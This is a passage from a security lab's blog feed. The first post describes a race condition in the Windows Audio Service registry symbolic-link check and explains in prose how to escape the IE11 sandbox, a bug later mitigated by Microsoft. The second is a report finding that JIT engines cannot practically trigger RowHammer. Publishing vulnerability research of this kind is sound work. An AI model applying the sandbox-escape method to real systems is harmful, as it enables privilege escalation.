<p>DetectRegistryLink has strict check on symbolic links. It first opens the key with flag REG_OPTION_OPEN_LINK, which prevents the redirection, then check for many different cases, including redirection to non-existing keys. After performing all the checks, the key handle is passed out of the function for reuse.</p>
<p>The upper level function SafeRegCreateKeyEx use DetectRegistryLink to check the key for symbolic links before creating new sub key, use NtDeleteKey to delete the symbolic link (with the previously opened handle) if found any, and finally use RegCreateKeyEx to create a new, “safe to use” sub key.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">HKEY sub_key_handle;</span><br><span class="line"><span class="keyword">int</span> detect_result = DetectRegistryLink(key_handle, kSubKeyPath, &amp;sub_key_handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detect_result == <span class="number">1</span>) &#123;</span><br><span class="line">    status = NtDeleteKey(sub_key_handle);</span><br><span class="line">    RegCloseKey(sub_key_handle);</span><br><span class="line">    sub_key_handle = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detect_result &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sub_key_handle) &#123;</span><br><span class="line">        RegCloseKey(sub_key_handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ERROR_ACCESS_DENIED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD create_disposition = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sub_key_handle) &#123;</span><br><span class="line">    create_disposition = REG_OPENED_EXISTING_KEY;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    status = RegCreateKeyExW(key_handle,</span><br><span class="line">                             kSubKeyPath,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="literal">nullptr</span>,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             KEY_ALL_ACCESS,</span><br><span class="line">                             <span class="literal">nullptr</span>,</span><br><span class="line">                             &amp;sub_key_handle,</span><br><span class="line">                             &amp;create_disposition);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (create_disposition != REG_CREATED_NEW_KEY) &#123;</span><br><span class="line">        RegCloseKey(sub_key_handle);</span><br><span class="line">        <span class="keyword">return</span> ERROR_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02_The_Flaw">0x02 The Flaw</h2><p>There is a serious flaw hidden inside this seemingly strict logic.</p>
<p>After NtDeleteKey deletes the symbolic link, the operating system no longer allow any additional operation to be performed on that key. The already opened handles remain valid, but any operation other than closing the key fails with STATUS_KEY_DELETED.</p>
<p>After the key handle is closed, the remaining operation must create a new key with a new handle. In this situation, the object with the same name is not guaranteed to be the same object.</p>
<p>With a precise timing attack, we could create a symbolic link just before the RegCreateKeyEx operation, bypassing the symbolic link check.</p>
<h2 id="0x03_The_Exploit">0x03 The Exploit</h2><p>We take IE 11 sandbox as an example to demonstrate how to escalate privilege with this vulnerability.</p>
<p>To exploit this vulnerability, we first need to make Windows Audio Service perform the delete operation.</p>
<p>We can purposely place a symbolic link under the HKCU\Software\Microsoft\Internet Explorer\LowRegistry\Audio\PolicyConfig registry key, and trigger Windows Audio Service to save its configuration.</p>
<p>It is vital to control the timing of the second symbolic link placement. Of course we could create millions of threads trying to win the race, but the operating system already provides us with a handy mechanism.</p>
<p>NtNotifyChangeKey can watch a specific registry key, and signal an event upon certain operation is performed on that key.</p>
<p>By setting a notification on our first symbolic link, we can receive a notification right after it is deleted by Windows Audio Service, and have a chance to create a second symbolic link just before Windows Audio Service calls RegCreateKeyEx.</p>
<p>We can then point the symbolic link to a non-existing GUID under HKCU\Software\Microsoft\Internet Explorer\Low Rights\ElevationPolicy to satisfy the REG_CREATED_NEW_KEY requirement. The target key will be created by Windows Audio Service.</p>
<p>Finally, Windows Audio Service will use upper level key (PolicyConfig)’s ACL to overwrite target key’s ACL, making it controllable by Low IL processes.</p>
<p>At this point the exploitation is successful. We can now write arbitrary AppPath and set Policy to 0x3 to escape from the sandbox.</p>
<h2 id="0x04_The_Trick">0x04 The Trick</h2><p>The registry operation performed by the Windows Audio Service is done after RpcImpersonateClient. Although the race can be successful inside IE sandbox, the registry operation will be performed with the originating process’ token, which do not have sufficient privilege.</p>
<p>James Forshaw did not solve this problem in his original PoC, the registry operation has to be performed by manually starting SndVol.exe.</p>
<p>To solve it we have to find a Medium or higher IL process that uses audio session — basically anything that emits sound — and can be repeatedly triggered to allow multiple retries.</p>
<p>IE Elevation Policy is preloaded with some system applications that can be started inside sandbox with Medium IL, including Notepad.exe. After the Medium IL process is started, the returned handle only have the right to terminate the process. But we can still pass command line parameters.</p>
<p>When Notepad is opening a non-existing file, it displays a dialog asking if the user would like to create that file. The dialog follows a default system sound. This is sufficient to trigger a registry write by Windows Audio Service.</p>
<p>With multiple retries we can ensure successful exploitation.</p>
<h2 id="0x05_The_Mitigation">0x05 The Mitigation</h2><p>Microsoft completely disabled the creation of registry symbolic link at Low IL in a patch released in August 2015. When setting registry symbolic link, the kernel uses RtlIsSandboxedToken to check the current process’ token, and return STATUS_ACCESS_DENIED on any Low IL or AppContainer token. This rendered any registry symbolic link based exploits unusable at Low IL, and effectively eliminates the possibility of exploiting this vulnerability inside the IE sandbox.</p>
<h2 id="References">References</h2><ol>
<li>Issue 99: IE11 AudioSrv RegistryKey EPM Privilege Escalation - James Forshaw<br><a href="https://code.google.com/p/google-security-research/issues/detail?id=99" target="_blank" rel="external">https://code.google.com/p/google-security-research/issues/detail?id=99</a></li>
<li>Vulnerability in Windows Audio Service Could Allow Elevation of Privilege (3005607)<br><a href="https://technet.microsoft.com/library/security/MS14-071" target="_blank" rel="external">https://technet.microsoft.com/library/security/MS14-071</a></li>
<li>Windows 10 Symbolic Link Mitigations - James Forshaw<br><a href="https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html" target="_blank" rel="external">https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>James Forshaw reported a vulnerability to Microsoft regarding Windows Audio Service in November 2014. In our analysis, we discovered that the patch Microsoft release later did not completely solve the problem. With a combination of techniques, we successfully bypassed the patch and can exploit the vulnerability on patched system.<br>]]>
    
    </summary>
    
      <category term="Sandbox" scheme="http://xlab.tencent.com/en/tags/Sandbox/"/>
    
      <category term="Vulnerability" scheme="http://xlab.tencent.com/en/tags/Vulnerability/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Research report on using JIT to trigger RowHammer]]></title>
    <link href="http://xlab.tencent.com/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/"/>
    <id>http://xlab.tencent.com/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/</id>
    <published>2015-06-09T02:42:07.000Z</published>
    <updated>2015-11-30T05:39:07.000Z</updated>
    <content type="html"><![CDATA[<p>RowHammer is a problem with some DDR3 in which repeatedly accessing a row of memory can cause bit flips in adjacent rows. However it need to run the customized asm code on target machine to trigger RowHammer, so RowHammer is not easy to be used to attack. We have an idea that try to use script language to trigger RowHammer. If it works, RowHammer will be more dangerous. In order to verify our idea, we analyzed the Java Hotspot, Chrome V8, .NET CoreCLR and Firefox SpiderMonfey.<br><a id="more"></a></p>
<h1 id="0x00_Overview">0x00 Overview</h1><p>&emsp;&emsp;In a post published on Google Project Zero Blog, researchers explain that the RowHammer technique works by repeatedly accessing memory rows in DRAM to flip bits in adjacent rows. People worry about it because it need to update BIOS to fix this problem, it’s hard to solve. However it need to run the customized asm code on target machine to trigger RowHammer, so RowHammer is not easy to be used to attack.<br>&emsp;&emsp;We have an idea that try to use script language to trigger RowHammer. If it works, RowHammer will be more dangerous. In order to verify our idea, we analyzed the Java Hotspot, Chrome V8, .NET CoreCLR and Firefox SpiderMonfey.<br>&emsp;&emsp;Finally we didn’t find useful attack vector. Some of them don’t generate instructions needed to trigger RowHammer, some of them cannot trigger RowHammer due to small amount and slow speed of the instruction generation, some of them need environment modified to trigger so that we cannot use them to attack directly.   </p>
<h1 id="0x01_RowHammer">0x01 RowHammer</h1><p>&emsp;&emsp;In this section, we briefly review the root cause of RowHammer, how to trigger it and the limitation we will face with when trying to use it to attack.   </p>
<h2 id="1-1_What’s_RowHammer?">1.1 What’s RowHammer?</h2><p>&emsp;&emsp;RowHammer is a problem with some DDR3 in which repeatedly accessing a row of memory can cause bit flips in adjacent rows. As shown in Figure 1.1(a), DRAM comprises a two-dimensional array of DRAM cells. As shown in Figure 1.1(b), one cell consists of a capacitor and an access-transistor. The access-transistor connects to wordline and the capacitor stores the data. The data in a row can be accessible only if the wordline is in high voltage. The data in the row is transferred to row-buffer. When a wordline’s voltage toggle on and off repeatedly, some cells on nearby rows lose voltage. If it cannot retrain charge for even 64ms, this will lead to lose data.</p>
<p>&emsp;&emsp;Figure 1.2 shows a 2GB rank, whose 256K rows are vertically partitioned into eight banks of 32K rows, where each row is 8KB (64Kb). Each bank has its own dedicated row-buffer. Notice that accessing the rows in different bank is not able to trigger the RowHammer.<br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img1.png" alt="[Figure 1.1]" title="[Figure 1.1]"></p>
<center>Figure 1.1</center><br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img2.png" alt="[Figure 1.2]" title="[Figure 1.2]"><br><center>Figure 1.2</center>                    

<h2 id="1-2_Trigger_RowHammer">1.2 Trigger RowHammer</h2><p>&emsp;&emsp;Google Project Zero gives the snippet of code that can cause RowHammer.<br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img3.png" alt="img3.png" title=""><br>&emsp;&emsp;Address of X and Y is very important if you want to trigger RowHammer. X and Y must point to the same bank but different rows. Because each bank has its row-buffer and if we access the same row the wordline will not toggle on and off repeatedly. </p>
<p>&emsp;&emsp;This snippet of the code is available to trigger the RowHammer. But it isn’t the only one we can use. Notice that any code that can toggle the wordline can be used to trigger the RowHammer.</p>
<h2 id="1-3_Instruction_needed">1.3 Instruction needed</h2><p>&emsp;&emsp;In order to toggle the wordline on and off repeatedly, we have to deal with CPU Cache, if the address we want to access is already in Cache, the wordline will not be set to high voltage. </p>
<table>
<thead>
<tr>
<th>Instruction</th>
<th style="text-align:center">Action</th>
</tr>
</thead>
<tbody>
<tr>
<td>CLFLUSH</td>
<td style="text-align:center">Flush the address form cache</td>
</tr>
<tr>
<td>PREFETCH</td>
<td style="text-align:center">Prefetch the data into the cache</td>
</tr>
<tr>
<td>MOVNT*</td>
<td style="text-align:center">Non-temporal memory access</td>
</tr>
</tbody>
</table>
<p>&emsp;&emsp;The instructions above can be used to access some address and bypass the cache. So using these instructions we can toggle the wordline and trigger the RowHammer.  </p>
<h1 id="0x02_Using_Script_to_trigger_RowHammer">0x02 Using Script to trigger RowHammer</h1><p>&emsp;&emsp;The POC that Google Project Zero provides uses ASM code, it can be used to verify whether your devices are vulnerable. We know that most of the script languages have JIT compiler. If we can use the script to control the JIT compiler trigger RowHammer, the things will get worse. We research the Java Hotspot, Chrome V8, .Net CoreCLR and Firefox SpiderMonkey to verify the feasibility of our idea. </p>
<h2 id="2-1_Java_Hotspot">2.1 Java Hotspot</h2><p>&emsp;&emsp;The Java Hotspot Virtual Machine is a core component of the Java SE platform. It implements the Java Virtual Machine Specification. As the Java bytecode execution engine, it also includes dynamic compilers that adaptively compile Java bytecodes into optimized machine instructions. Hotspot is the Stack based virtual machine. The bytecodes are stored in the class file. As the input to hotspot, it is user controllable. What we care about is whether we can customize class file to make the Java Hotspot trigger the RowHammer.<br>&emsp;&emsp;When Java Hotspot runs Java bytecode, it continually analyzes the program’s performance for “hot spot” which are frequently or repeatedly executed. The JIT compiler would be used to compile these codes.<br>&emsp;&emsp;The default interpreter that comes with the Hotspot is the so called “Template Interpreter”. A second interpreter existed beside the template interpreter is a C++ interpreter its main interpreter loop is implemented in C++. The JIT compiler in Java Hotspot has three implementation, the client compiler (C1 Compiler), the server compiler (C2 Compiler) and the Shark Compiler ( LLVM based Compiler).<br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img4.png" alt="img4.png" title=""><br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img5.png" alt="img5.png" title="">  </p>
<center>Figure 2.1</center>

<h3 id="2-1-1_Interpreter_trigger_RowHammer?">2.1.1 Interpreter trigger RowHammer?</h3><h4 id="a)_The_working_mechanism_of_template_interpreter">a) The working mechanism of template interpreter</h4><p>&emsp;&emsp;The template interpreter is basically created at runtime from a kind of assembler templates which are translated into real machine code. It interprets a Java program by bytecode. When the interpreter gets a new bytecode, the corresponding native machine code would be called.<br>&emsp;&emsp;In order to interpret the Java program, Java Hotspot generates a lot of code stub when it starts such as StubRoutines::call_stub and StubRoutines::catch_exception. The command “java -XX:+PrintInterpterter” can be used to show the code stub that could be called in the interpret process.<br>&emsp;&emsp;Notice that the native machine code stub is a little big. For example, the code size of “invokevitual” is 352 bytes, and the code size of “putstatic” is 512 bytes. </p>
<h4 id="b)_Whether_the_interpreter_can_trigger_RowHammer?">b) Whether the interpreter can trigger RowHammer?</h4><p>&emsp;&emsp;Whether we can customize the class file to make the Interpreter generate the machine code that we need to trigger the RowHammer. After analysis, we could not find the instructions such as prefetch, clflush and movnt* in the machine codes that generated in the interpreter. So we can’t use the template interpreter to trigger the RowHammer.   </p>
<h3 id="2-1-2_JIT_Compiler_trigger_RowHammer?">2.1.2 JIT Compiler trigger RowHammer?</h3><h4 id="a)_The_working_mechanism_of_C1_Compiler">a) The working mechanism of C1 Compiler</h4><p>&emsp;&emsp;C1 Compiler is a fast, lightly optimizing bytecode compiler. It performs some value numbering, inlining, and class analysis. It uses a simple CFG-oriented SSA “high” IR, a machine-oriented “low” IR, a linear scan register allocation, and a template-style code generator.<br>&emsp;&emsp;The compiler is asynchronous, the “CompilerThread” thread in Hotspot compile the method that needed to be compiled. The command “-XX: +CompileThreshold” can be used to set the number of method invocations before compiling.<br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img6.png" alt="img6.png" title=""></p>
<center>Figure 2.2</center><br>&emsp;&emsp;In the source code of the hotspot,C1 Compiler has such phases:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">  _t_compile,</span><br><span class="line">  _t_setup,</span><br><span class="line">  _t_optimizeIR,</span><br><span class="line">  _t_buildIR,</span><br><span class="line">  _t_emit_lir,</span><br><span class="line">  _t_linearScan,</span><br><span class="line">  _t_lirGeneration,</span><br><span class="line">  _t_lir_schedule,</span><br><span class="line">  _t_codeemit,</span><br><span class="line">  _t_codeinstall,</span><br><span class="line">  max_phase_timers</span><br><span class="line">&#125; TimerName;</span><br></pre></td></tr></table></figure><br><br>C1 Compiler can be briefly described as Figure 2.2 shows:<br>#### 1) Build HIR<br>&emsp;&emsp;C1 Compiler iterates the Java bytecodes in the class file and translates it into CFG (Control Flow Graph). The basic block of the CFG uses SSA to represent the instructions. HIR is a “high” IR far from machine code.<br>#### 2) Emit LIR<br>&emsp;&emsp;Iterate the basic blocks in the CFG, and iterate the instructions in the basic block. Translate the HIR to LIR. LIR is a “low” IR which is close to machine code.<br>#### 3) Register allocation<br>&emsp;&emsp;LIR uses many virtual register, in this phase, the compiler need to allocate the real register. The C1 Compiler uses the linear scan to allocate the register.<br>#### 4) Machine code generate<br>&emsp;&emsp;This is the phase to emit code, to genrate the real code. It iterates the instructions in the LIR to generate the machine code. The compile uses the LIR_Assembler class to finish this job, just as blow:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIR_Assembler lir_asm(<span class="keyword">this</span>);</span><br><span class="line">lir_asm.emit_code<span class="function"><span class="params">(hir()-&gt;code())</span>;</span></span><br></pre></td></tr></table></figure><br>&emsp;&emsp;The compiler iterates the LIR_list, invoke each instruction’s emit code. All instructions are the sub class of the LIR_Op. so they have “emit_code” method.<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op-&gt;emit_code<span class="list">(<span class="keyword">this</span>)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><br>&emsp;&emsp;Let’s see LIR_Op1, its “emit_code” method is:<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> LIR_Op1::emit_code(LIR_Assembler* masm) &#123;    <span class="comment">//emit_code</span></span><br><span class="line">  masm-&gt;emit_op1(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>&emsp;&emsp;If the Operand of the LIR_Op1 is “lir_prefetchr”<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> lir_prefetchr:</span><br><span class="line">  prefetchr(op-&gt;in_opr());</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><br>&emsp;&emsp;Then it will invoke the prefetchr function, it is platform-dependent, in x86, the code is in assembler_x86.cpp<br><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void Assembler<span class="value">::<span class="function">prefetchr</span>(Address src) &#123;</span><br><span class="line">  <span class="function">assert</span>(VM_Version::<span class="function">supports_3dnow_prefetch</span>(), <span class="string">"must support"</span>);</span></span><br><span class="line">  InstructionMark <span class="function">im</span>(this);</span><br><span class="line">  <span class="function">prefetch_prefix</span>(src);</span><br><span class="line">  <span class="function">emit_byte</span>(0x0D);</span><br><span class="line">  <span class="function">emit_operand</span>(rax, src); <span class="comment">// 0, src</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;At last the compiler will generate the real executable machine code.<br><br>#### b)    Whether the C1 Compiler can trigger RowHammer<br>&emsp;&emsp;Whether the C1 Compiler can trigger RowHammer or not? We actually find the prefetch instruction in X86, it means we have hope to trigger RowHammer.<br>&emsp;&emsp;From bottom to top, if we want to get prefetch instruction, we need the LIR_Op1, and its openrand is lir_prefetchr or lir_prefetchw in LIR. To achieve this, we need to invoke the GraphBuilder::append_unsafe_prefetch function in HIR. The function is called by GraphBuilder::try_inline_instrinsics function. As last we found if we invoke the prefetch<em> method in sun.misc.Unsafe, we can get it. So the Hotspot does support prefetch. It treats Unsafe.prefetchRead() and Unsafe.prefetchWrite() methods as intrinsics. The method would generate prefetch instruction in the machine code. But unfortunately, sun.misc.Unsafe in rt.jar dose not declare such methods. We have to modify rt.jar to trigger that. What a pity!<br><br>&emsp;&emsp;In Hotspot, we also find the CLFLUSH instruction, when hotspot starts, it will generate a code stub<br><br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__ bind<span class="list">(<span class="keyword">flush_line</span>)</span><span class="comment">;                         </span></span><br><span class="line">__ clflush<span class="list">(<span class="keyword">Address</span><span class="list">(<span class="keyword">addr</span>, <span class="number">0</span>)</span>)</span><span class="comment">;          //addr: address to flush </span></span><br><span class="line">__ addptr<span class="list">(<span class="keyword">addr</span>, ICache:<span class="keyword">:line_size</span>)</span><span class="comment">;                                         </span></span><br><span class="line">__ decrementl<span class="list">(<span class="keyword">lines</span>)</span><span class="comment">;                   //lines: range to flush</span></span><br><span class="line">__ jcc<span class="list">(<span class="keyword">Assembler</span>:<span class="keyword">:notZero</span>, flush_line)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><br>The code stub can be invoked in the last phase of C1 compiler.<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// done</span></span><br><span class="line">masm<span class="comment">()</span>-&gt;flush<span class="comment">()</span>;             <span class="comment">//invoke ICache flush</span></span><br></pre></td></tr></table></figure><br>It try to flush the cache that instruction stored.<br><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void AbstractAssembler<span class="value">::<span class="function">flush</span>() &#123;</span><br><span class="line">  <span class="function">sync</span>();</span></span><br><span class="line">  ICache<span class="value">::<span class="function">invalidate_range</span>(<span class="function">addr_at</span>(<span class="number">0</span>), <span class="function">offset</span>());</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>&emsp;&emsp;Use this we can flush a range of address, but the problem is the address is uncontrollable, we cannot flush the address we wanted. And the compiler will spend much time, we cannot get enough CLFLUSH in 64ms.<br><br>#### c) Other Compiler<br>&emsp;&emsp;C2 Compiler is different from C1 Compiler. C2 Compiler is highly optimizing bytecode compiler. Optimizations include global value numbering, conditional constant type propagation, constant folding, and global code motion and so on. We cannot generate prefetch, clflush, movnt</em> instruction directly.<br>&emsp;&emsp;Shark Compiler is based on LLVM, we ignore it because it`s not the default compiler.<br><br><h2> 2.2 Chrome V8</h2><br>&emsp;&emsp;The V8 JavaScript Engine is an open source JavaScript engine developed by Google Chrome web browser. V8 compiles JavaScript to native machine code before executing it. V8 does not have interpreter, it translates JavaScript to AST (Abstract Syntax Tree), then walks the AST to generate machine codes.<br>&emsp;&emsp;After research, we did not find clflush, movnt* instructions when V8 compile the JavaScript. We found prefetch instruction in a function.<br>&emsp;&emsp;The function that generate prefetch is:<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MemMoveFunction <span class="function">CreateMemMoveFunction</span>() &#123;</span><br><span class="line"></span><br><span class="line">  __ <span class="function">prefetch</span>(<span class="function">Operand</span>(src, 0), 1);</span><br><span class="line">  __ <span class="function">cmp</span>(count, kSmallCopySize);    <span class="comment">//kSmallCopySize=8</span></span><br><span class="line">  __ <span class="function">j</span>(below_equal, &amp;small_size);  </span><br><span class="line">  __ <span class="function">cmp</span>(count, kMediumCopySize);   <span class="comment">//kMediumCopySize=63</span></span><br><span class="line">  __ <span class="function">j</span>(below_equal, &amp;medium_size);</span><br><span class="line">  __ <span class="function">cmp</span>(dst, src);</span><br><span class="line">  __ <span class="function">j</span>(above, &amp;backward);</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;This function is used to move memory, when the instruction buffer is not big enough to store the compiled code. V8 has to enlarge the buffer, at this time the instruction can be generated one time. It cannot be used to trigger RowHammer.<br><br><h2> 2.3 .NET CoreCLIR</h2><br>&emsp;&emsp;CoreCLR is the .NET Core Runtime. It includes RyuJIT, the .NET GC and many other components. RyuJIT is the JIT compiler in .NET CoreCLR. RyuJIT only defines some common x86 instructions (Figure 2.3) that do not include the instruction needed to trigger RowHammer.<br>&emsp;&emsp;We found the prefetch instruction in .NET GC component, just as shown in Figure2.4 But unfortunately the prefetch is disable by default (Figure 2.5).<br><img src="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img7.png" alt="img7.png" title=""><br><center>Figure 2.3</center><br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void gc_heap<span class="number">::</span>relocate_survivor_helper (BYTE* plug, BYTE* plug_end)</span><br><span class="line">&#123;</span><br><span class="line">    BYTE*  x = plug<span class="comment">;</span></span><br><span class="line">    while (x &lt; plug_end)</span><br><span class="line">    &#123;</span><br><span class="line">        size_t s = size (x)<span class="comment">;</span></span><br><span class="line">        BYTE* next_obj = x + Align (s)<span class="comment">;</span></span><br><span class="line">        Prefetch (next_obj)<span class="comment">;</span></span><br><span class="line">        relocate_obj_helper (x, s)<span class="comment">;</span></span><br><span class="line">        assert (s &gt; 0)<span class="comment">;</span></span><br><span class="line">        x = next_obj<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><center>Figure 2.4</center>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#define PREFETCH</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> PREFETCH</span></span><br><span class="line">__declspec(naked) <span class="keyword">void</span> __<span class="function">fastcall <span class="title">Prefetch</span><span class="params">(<span class="keyword">void</span>* addr)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">   __asm &#123;</span><br><span class="line">       PREFETCHT0 [ECX]</span><br><span class="line">        ret</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span> <span class="comment">//PREFETCH</span></span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Prefetch</span> <span class="params">(<span class="keyword">void</span>* addr)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">//PREFETCH</span></span></span><br></pre></td></tr></table></figure>
<center>Figure 2.5</center>

<h2 id="2-4_Firfox_SpiderMonkey">2.4 Firfox SpiderMonkey</h2><p>&emsp;&emsp;SpiderMonkey provides JavaScript support for Mozilla Firefox, we didn’t find the instructions needed to trigger RowHammer in it.</p>
<h1 id="0x03_Conclusion">0x03 Conclusion</h1><p>&emsp;&emsp;The purpose of our research is to trigger RowHammer through script languages. In order to improve the efficiency of the language, most of them has JIT compiler. We analyzed Hotspot, Chrome V8, .NET CoreCLR and SpiderMonkey to try to verify our idea. But finally we found it is hard to get what we want.</p>
<p>1) Trigger RowHammer is not easy, we only have 64ms. It means the number of irrelevant instructions must be very few. Otherwise the number of the wordline toggle on and off is not enough to trigger RowHammer. </p>
<p>2) The instruction we need is uncommon. The compiler does not generate these instructions directly.</p>
<p>3) In the view of JIT compiler developers, in order to cross-platform, JIT usually abstracts the instruction, and implements it on different platforms. So the abstracted instruction is as few as possible. Because more instructions means much more codes. In the source code we analyzed, only hotspot abstracts the prefetch instruction. JIT compiler always try to avoid a lot of instruction definitions. (There are some special cases where script languages use third-party JIT engine such as AsmJIT, the engine usually supports all instructions. But for now, most languages always build JIT dependently).</p>
<p>4) In our research, we found the instruction we need always generated to assistance JIT compile process. For example, using prefetch to increase the speed of data move, using clflush to flash cache to assure the execution of the code generated. Instructions are not translated from script directly, the RowHammer problem cannot be triggered due to the small amount and slow speed of the instruction generation.</p>
<h1 id="Resources">Resources</h1><ol>
<li>Google Project Zero<br><a href="http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html" target="_blank" rel="external">http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html</a></li>
